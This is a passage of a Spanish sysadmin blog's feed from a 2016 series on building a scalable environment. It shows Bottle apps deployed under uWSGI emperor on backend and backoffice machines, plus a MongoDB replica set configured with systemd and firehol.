&lt;p&gt;Este punto se ejecuta solamente en los &lt;em&gt;backends&lt;/em&gt; (&lt;em&gt;backend1&lt;/em&gt; y &lt;em&gt;backend2&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Eliminamos la aplicación de administración, que no se usa en los &lt;em&gt;backends&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# rm -R shop/shop_admin/
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así nos queda la carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# tree shop
shop
├── requirements.txt
└── shop_api
    └── app.py

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Copiamos la carpeta a &lt;em&gt;/opt/&lt;/em&gt; que va a ser su emplazamiento habitual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# cp -R shop/ /opt/
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a trabajar ya desde la carpeta contenedora del proyecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/shop/
root@backend1:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso es crear el conjunto de librerías necesarias, construyendo un &lt;em&gt;virtualenv&lt;/em&gt; con las librerías. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:/opt/shop# /root/virtualenv-14.0.6/virtualenv.py env
New python executable in /opt/shop/env/bin/python
Installing setuptools, pip, wheel...done.
root@backend1:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Activamos el entorno virtual para instalar las librerías declaradas en el fichero &lt;em&gt;requirements.txt&lt;/em&gt;. Luego salimos del entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:/opt/shop# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@backend1:/opt/shop# pip install -r requirements.txt
Collecting &lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.9 &lt;span class="o"&gt;(&lt;/span&gt;from -r requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
...
Installing collected packages: bottle, pymongo
Successfully installed bottle-0.12.9 pymongo-3.2
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@backend1:/opt/shop# deactivate
root@backend1:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y para evitarnos problemas de permisos, uniformizamos el propietario de la carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# chown -R www-data:www-data /opt/shop/
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con todo lo necesario para levantar la aplicación, la declaramos como &lt;em&gt;vasallo&lt;/em&gt; del &lt;em&gt;emperador&lt;/em&gt;; el mismo &lt;strong&gt;emperador&lt;/strong&gt; va a levantar un proceso para servir esa configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:/opt/shop# cat /etc/uwsgi-emperor/vassals/shop_api.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
http-socket &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/shop/env
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/shop/shop_api
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
root@backend1:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos comprobar que todo funciona como debe haciendo una petición a la &lt;strong&gt;API&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backend1:~# curl -i http://localhost:8080/products/
HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Content-Length: &lt;span class="m"&gt;3&lt;/span&gt;
Content-Type: application/json
Backend: backend1

&lt;span class="o"&gt;[]&lt;/span&gt;
root@backend1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Aplicación de backoffice: la interfaz de administración&lt;/h3&gt;
&lt;p&gt;Este punto aplica solamente a la máquina &lt;em&gt;backoffice&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;El proceso es análogo al de los &lt;em&gt;backends&lt;/em&gt;; quitamos la aplicación que no vamos a utilizar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:~# rm -R shop/shop_api/
root@backoffice:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así nos queda la carpeta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:~# tree shop
shop
├── requirements.txt
└── shop_admin
    ├── app.py
    └── views
        ├── index.tpl
        ├── product_form.tpl
        └── product_list.tpl

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;5&lt;/span&gt; files
root@backoffice:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La transferimos a la carpeta &lt;em&gt;/opt/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:~# cp -R shop/ /opt/
root@backoffice:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nos situamos en la carpeta contenedora:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/shop/
root@backoffice:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos el &lt;em&gt;virtualenv&lt;/em&gt; en la carpeta contenedora.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:/opt/shop# /root/virtualenv-14.0.6/virtualenv.py env
New python executable in /opt/shop/env/bin/python
Installing setuptools, pip, wheel...done.
root@backoffice:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y le instalamos las librerías necesarias, declaradas en el fichero &lt;em&gt;requirements.txt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:/opt/shop# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@backoffice:/opt/shop# pip install -r requirements.txt
Collecting &lt;span class="nv"&gt;bottle&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.12.9 &lt;span class="o"&gt;(&lt;/span&gt;from -r requirements.txt &lt;span class="o"&gt;(&lt;/span&gt;line &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;
...
Installing collected packages: bottle, pymongo
Successfully installed bottle-0.12.9 pymongo-3.2
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@backoffice:/opt/shop# deactivate
root@backoffice:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Actualizamos el propietario de la aplicación &lt;strong&gt;WSGI&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:/opt/shop# chown -R www-data:www-data /opt/shop/
root@backoffice:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y creamos el fichero de configuración del &lt;em&gt;vasallo&lt;/em&gt;, para que lo levante el &lt;em&gt;emperador&lt;/em&gt;, quedando así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:/opt/shop# cat /etc/uwsgi-emperor/vassals/shop_admin.ini
&lt;span class="o"&gt;[&lt;/span&gt;uwsgi&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;plugin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; python
http-socket &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0:8080
&lt;span class="nv"&gt;master&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
&lt;span class="nv"&gt;workers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="nv"&gt;virtualenv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/shop/env
&lt;span class="nv"&gt;chdir&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; /opt/shop/shop_admin
&lt;span class="nv"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; app:app
root@backoffice:/opt/shop#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y comprobamos que obtenemos la página web que se espera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@backoffice:~# curl -i http://localhost:8080/
HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Content-Length: &lt;span class="m"&gt;33&lt;/span&gt;
Content-Type: text/html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;UTF-8

&amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/products&amp;quot;&lt;/span&gt;&amp;gt;Products&amp;lt;/a&amp;gt;
root@backoffice:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto hemos acabado con las aplicaciones. Nuevamente, todo lo que queda en la carpeta &lt;em&gt;/root/&lt;/em&gt; es desechable.&lt;/p&gt;
&lt;p&gt;En el siguiente artículo vamos a montar el &lt;em&gt;proxy&lt;/em&gt;/balanceador que va a actuar como fachada de todo el sistema.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="WSGI"></category><category term="uWSGI"></category><category term="python"></category><category term="virtualenv"></category><category term="firehol"></category></entry><entry><title>Creando un entorno escalable (II)</title><link href="http://www.linuxsysadmin.ml/2016/03/creando-un-entorno-escalable-2.html" rel="alternate"></link><published>2016-03-07T08:00:00+01:00</published><updated>2016-03-07T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-03-07:/2016/03/creando-un-entorno-escalable-2.html</id><summary type="html">&lt;p&gt;Seguimos con la serie de montar un entorno escalable. Tras explicar en el primer artículo lo que vamos a montar, seguimos con ello. En este artículo vamos a montar un &lt;em&gt;cluster&lt;/em&gt; de bases de datos; será &lt;strong&gt;mongodb&lt;/strong&gt; porque la aplicación lo requiere y usará la topología de un &lt;strong&gt;replica set …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Seguimos con la serie de montar un entorno escalable. Tras explicar en el primer artículo lo que vamos a montar, seguimos con ello. En este artículo vamos a montar un &lt;em&gt;cluster&lt;/em&gt; de bases de datos; será &lt;strong&gt;mongodb&lt;/strong&gt; porque la aplicación lo requiere y usará la topología de un &lt;strong&gt;replica set&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Este artículo se basa enormemente en &lt;a href="http://www.linuxsysadmin.ml/2015/12/construyendo-una-replica-set-en-mongodb.html"&gt;otro artículo&lt;/a&gt; que ya publicamos, al que vamos a añadir algunas mejoras reflejadas en otros.&lt;/p&gt;
&lt;p&gt;Como ya vimos en el artículo referido, solo necesitamos levantar un proceso &lt;em&gt;mongod&lt;/em&gt; en cada una de las máquinas, para posteriormente casarlos entre sí.&lt;/p&gt;
&lt;h2&gt;Levantando los procesos de mongodb&lt;/h2&gt;
&lt;p&gt;Este punto se repite en las máquinas que van a formar la &lt;strong&gt;replica set&lt;/strong&gt;, que son &lt;em&gt;mongo1&lt;/em&gt;, &lt;em&gt;mongo2&lt;/em&gt; y &lt;em&gt;backoffice&lt;/em&gt;. Vamos a seguir solamente una de ellas; el resto son análogas.&lt;/p&gt;
&lt;p&gt;Crearemos una estructura en &lt;em&gt;/opt/&lt;/em&gt; para alojar los binarios, las configuraciones, los datos y los logs.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# mkdir -p /opt/mongodb/&lt;span class="o"&gt;{&lt;/span&gt;bin,conf,data,logs&lt;span class="o"&gt;}&lt;/span&gt;
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En la carpeta de binarios vamos a poner el único que se necesita: el &lt;em&gt;mongod&lt;/em&gt;. Lo podemos sacar descomprimiendo el 
fichero comprimido &lt;em&gt;.tar.gz&lt;/em&gt; de la página de descargas de &lt;strong&gt;mongodb&lt;/strong&gt;. En nuestro caso concreto, lo he sacado de &lt;a href="https://fastdl.mongodb.org/linux/mongodb-linux-i686-3.2.3.tgz"&gt;https://fastdl.mongodb.org/linux/mongodb-linux-i686-3.2.3.tgz&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cp mongodb-linux-i686-3.2.3/bin/mongod /opt/mongodb/bin/
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ponemos un fichero de configuración para la instancia que queremos correr. Esta configuración puede variar mucho, pero un ejemplo básico para salir del paso con una máquina de 32 bits (que no soportan &lt;em&gt;WiredTiger&lt;/em&gt;) podría ser:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cat /opt/mongodb/conf/mongo.conf
systemLog:
    path: /opt/mongodb/logs/mongo.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27017&lt;/span&gt;
    bindIp: &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0

storage:
    dbPath: /opt/mongodb/data/
    engine: mmapv1
    mmapv1:
        smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;

replication:
    replSetName: rs
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Truco&lt;/strong&gt;: Es un buen momento para montar un sistema de ficheros alternativo para almacenar los datos, sea poner &lt;a href="http://www.linuxsysadmin.ml/2016/01/lvm-logical-volume-manager.html"&gt;LVM&lt;/a&gt; (para tener crecimiento dinámico o &lt;a href="http://www.linuxsysadmin.ml/2016/02/haciendo-snapshots-con-lvm.html"&gt;snapshots&lt;/a&gt;, sea un &lt;a href="http://www.linuxsysadmin.ml/2015/12/construyendo-un-raid-10-en-linux.html"&gt;RAID&lt;/a&gt; (por ejemplo para tener alto rendimiento y/o replicación de datos), o incluso ambos.&lt;/p&gt;
&lt;p&gt;Cumpliendo con una política de seguridad básica, vamos a crear un usuario de sistema para correr el proceso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# useradd -s /usr/sbin/nologin -r -M mongo -d /opt/mongodb/
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Le damos la propiedad de toda la estructura de &lt;strong&gt;mongodb&lt;/strong&gt;, para ahorrarnos problemas de permisos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# chown -R mongo:mongo /opt/mongodb/
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya como resumen, ponemos una salida para ver como nos queda la estructura:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# tree /opt/mongodb/
/opt/mongodb/
├── bin
│   └── mongod
├── conf
│   └── mongo.conf
├── data
└── logs

&lt;span class="m"&gt;4&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El último paso consiste en crear una &lt;em&gt;unit&lt;/em&gt; en &lt;strong&gt;systemd&lt;/strong&gt; (o un &lt;em&gt;init script&lt;/em&gt;, dependiendo de la distribución usada; de hecho, cada máquina puede ir con una distribución distinta).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cat /etc/systemd/system/mongo.service
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/mongo.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo activamos para que se levante solo en los siguientes arranques, y lo levantamos para la sesión actual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo
Created symlink from /etc/systemd/system/multi-user.target.wants/mongo.service to /etc/systemd/system/mongo.service.
root@mongo1:~# systemctl start mongo
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Repetid este paso en las otras máquinas de &lt;strong&gt;mongodb&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Consideraciones de seguridad&lt;/h2&gt;
&lt;p&gt;Para que una &lt;strong&gt;replica set&lt;/strong&gt; funcione como debe, todos los procesos deben comunicarse entre sí. Como los hemos puesto en el mismo puerto, podemos agruparlo todo en una sola regla.&lt;/p&gt;
&lt;p&gt;Como en nuestro caso estamos virtualizando con &lt;strong&gt;LXC&lt;/strong&gt;, vamos a controlar el tráfico con el &lt;strong&gt;firehol&lt;/strong&gt; de la máquina anfitriona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;...
root@lxc:~# cat /etc/firehol/firehol.conf
&lt;span class="nv"&gt;mongo_servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;10.0.0.5 10.0.0.6 10.0.0.7&amp;quot;&lt;/span&gt;
...  
router internal inface lxc0 outface lxc0
    route custom mongodb tcp/27017 default accept src &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$mongo_servers&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; dst &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$mongo_servers&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
...
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acordaos de reiniciar &lt;strong&gt;firehol&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Atando la replica set&lt;/h2&gt;
&lt;p&gt;Este paso se ejecuta en una sola máquina, que va a reproducir los cambios a las demás, por efecto de la &lt;strong&gt;replica set&lt;/strong&gt;. Por ejemplo, lo hago en &lt;em&gt;mongo1&lt;/em&gt;, por hacer alguna.&lt;/p&gt;
&lt;p&gt;Entramos en el &lt;em&gt;mongo shell&lt;/em&gt;, desde donde lanzaremos el resto de comandos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# ./mongodb-linux-i686-3.2.3/bin/mongo
MongoDB shell version: &lt;span class="m"&gt;3&lt;/span&gt;.2.3
connecting to: &lt;span class="nb"&gt;test&lt;/span&gt;
Welcome to the MongoDB shell.
For interactive help, &lt;span class="nb"&gt;type&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;help&amp;quot;&lt;/span&gt;.
...
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo los pasos estándares, creamos una configuración vacía en la máquina elegida, y añadimos las otras dos. Tened en cuenta que la máquina &lt;em&gt;backoffice&lt;/em&gt; se declara como un árbitro, por decisión de diseño.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt; rs.initiate&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;info2&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;no configuration specified. Using a default configuration for the set&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;me&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
rs:SECONDARY&amp;gt; rs.add&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;mongo2:27017&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
rs:PRIMARY&amp;gt; rs.addArb&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;backoffice:27017&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
rs:PRIMARY&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos verificar que todo está bien mediante el comando &lt;em&gt;rs.status()&lt;/em&gt;, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rs:PRIMARY&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;set&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;rs&amp;quot;&lt;/span&gt;,
...  
        &lt;span class="s2"&gt;&amp;quot;members&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
                &lt;span class="o"&gt;{&lt;/span&gt;
...  
                        &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo1:27017&amp;quot;&lt;/span&gt;,
                        &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;PRIMARY&amp;quot;&lt;/span&gt;,
...  
                &lt;span class="o"&gt;}&lt;/span&gt;,
                &lt;span class="o"&gt;{&lt;/span&gt;
...  
                        &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;mongo2:27017&amp;quot;&lt;/span&gt;,
                        &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;,
...  
                &lt;span class="o"&gt;}&lt;/span&gt;,
                &lt;span class="o"&gt;{&lt;/span&gt;
...  
                        &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;backoffice:27017&amp;quot;&lt;/span&gt;,
                        &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;ARBITER&amp;quot;&lt;/span&gt;,
...  
                &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
rs:PRIMARY&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y salimos del &lt;em&gt;mongo shell&lt;/em&gt;, que ya no necesitamos; las aplicaciones de &lt;em&gt;backend&lt;/em&gt; y de &lt;em&gt;backoffice&lt;/em&gt; ya incluyen una librería para conectarse por sí mismos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;rs:PRIMARY&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todo lo que queda en &lt;em&gt;/root/&lt;/em&gt; es innecesario y se puede borrar. De todas formas podemos dejar el resto de binarios en &lt;em&gt;/opt/mongodb/&lt;/em&gt; en alguna de las máquinas por si acaso.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;El siguiente paso va a ser montar los servidores de aplicaciones en los backends y en el backoffice&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="mongodb"></category><category term="replica set"></category><category term="systemd"></category><category term="firehol"></category></entry><entry><title>Creando un entorno escalable (I)</title><link href="http://www.linuxsysadmin.ml/2016/02/creando-un-entorno-escalable.html" rel="alternate"></link><published>2016-02-29T08:00:00+01:00</published><updated>2016-02-29T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-29:/2016/02/creando-un-entorno-escalable.html</id><summary type="html">&lt;p&gt;Mucha gente tiene un servidor único para alojar páginas web dinámicas, por ejemplo con &lt;strong&gt;PHP&lt;/strong&gt; y con &lt;strong&gt;MySQL&lt;/strong&gt;. Sin embargo, a veces esto puede resultar insuficiente; nos puede interesar tener un entorno de bajas especificaciones y de bajo coste, pero preparado crecer al mismo ritmo que lo hacen los usuarios …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Mucha gente tiene un servidor único para alojar páginas web dinámicas, por ejemplo con &lt;strong&gt;PHP&lt;/strong&gt; y con &lt;strong&gt;MySQL&lt;/strong&gt;. Sin embargo, a veces esto puede resultar insuficiente; nos puede interesar tener un entorno de bajas especificaciones y de bajo coste, pero preparado crecer al mismo ritmo que lo hacen los usuarios.&lt;/p&gt;
